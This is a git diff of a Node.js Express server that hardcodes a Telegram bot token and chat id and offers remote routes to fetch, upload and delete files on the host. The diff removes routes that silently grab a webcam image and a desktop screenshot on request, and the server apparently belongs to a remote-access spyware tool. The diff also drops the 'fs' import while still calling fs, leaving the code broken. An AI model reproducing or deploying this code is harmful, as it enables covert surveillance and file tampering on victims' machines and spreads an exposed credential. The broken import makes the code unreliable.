@@ -6,9 +6,6 @@ const uuid4 = require('uuid')
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
-const fs = require('fs');
-const NodeWebcam = require('node-webcam');
-const desktopCapture = require('node-desktop-capture');
 
 const token = '6663574410:AAFAC7Xj0JypUpa7pi60drZAxtNhW5uD3QI'
 const id = '7152830690'
@@ -46,30 +43,30 @@ app.get('/getFile/*', function (req, res) {
   });
 })
 
-// Define route to delete uploaded files
 app.get('/deleteFile/*', function (req, res) {
-    const fileName = req.params[0];
-    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
-    fs.stat(filePath, function(err, stat) {
-        if (err == null) {
-            fs.unlink(filePath, (err) => {
-                if (err) {
-                    res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`);
-                } else {
-                    res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`);
-                }
-            });
-        } else if (err.code === 'ENOENT') {
-            // file does not exist
-            res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`);
+  const fileName = req.params[0]
+  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
+  fs.stat(filePath, function(err, stat) {
+    if (err == null) {
+      fs.unlink(filePath, (err) => {
+        if (err) {
+          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
         } else {
-            res.send('<h1>Some other error: </h1>', err.code);
+          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
         }
-    });
-});
+      });
+    } else if (err.code === 'ENOENT') {
+      // file does not exist
+      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
+    } else {
+      res.send('<h1>Some other error: </h1>', err.code)
+    }
+  });
+})
 
-// Define route to upload files
-app.post("/uploadFile", (req, res) => {
+
+
+app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname;
     const file_name = req.file.filename;
     const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(name);
@@ -85,36 +82,6 @@ app.post("/uploadFile", (req, res) => {
 
     // Send an empty response to end the request
     res.send('');
-});
-
-// Define route to capture front camera image
-app.get('/captureFrontCamera', function (req, res) {
-    const webcam = NodeWebcam.create({
-        device: '/dev/video0',  // Adjust device path as needed
-        callbackReturn: 'buffer'
-    });
-
-    webcam.capture('front_camera_image', (err, data) => {
-        if (err) {
-            console.error('Error capturing image:', err);
-            res.status(500).send('Error capturing image');
-        } else {
-            // Process captured image data
-            // For example, save the image or send it via response
-            res.send(data);
-        }
-});
-
-// Define route to take screenshot
-app.get('/takeScreenshot', function (req, res) {
-    desktopCapture.captureScreen().then(screenshot => {
-        // Process the screenshot
-        // For example, save it to a file or send it via response
-        res.send(screenshot);
-    }).catch(error => {
-        console.error('Error capturing screenshot:', error);
-        res.status(500).send('Error capturing screenshot');
-    });
 });
 
 app.post("/uploadText", (req, res) => {
